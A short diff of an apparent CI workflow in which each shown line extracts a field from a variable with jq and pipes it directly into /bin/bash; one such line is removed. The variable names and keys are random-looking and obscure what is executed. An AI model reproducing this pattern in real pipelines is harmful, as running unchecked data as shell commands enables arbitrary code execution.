@@ -32,7 +32,6 @@ jobs:
           echo $sn246 | jq -r .yfva164 | /bin/bash
           printf '%s' "$twibq07" | jq -r .xnzts060 | /bin/bash
           echo $ojuxr908 | jq -r .jvuxb2903 | /bin/bash
-          printf '%s' "$w8906" | jq -r .xglw0802 | /bin/bash
           printf '%s' "$ya11" | jq -r .bhji0 | /bin/bash
           echo $wcl785 | jq -r .eo54 | /bin/bash
           printf '%s' "$vimb493" | jq -r .ln12 | /bin/bash
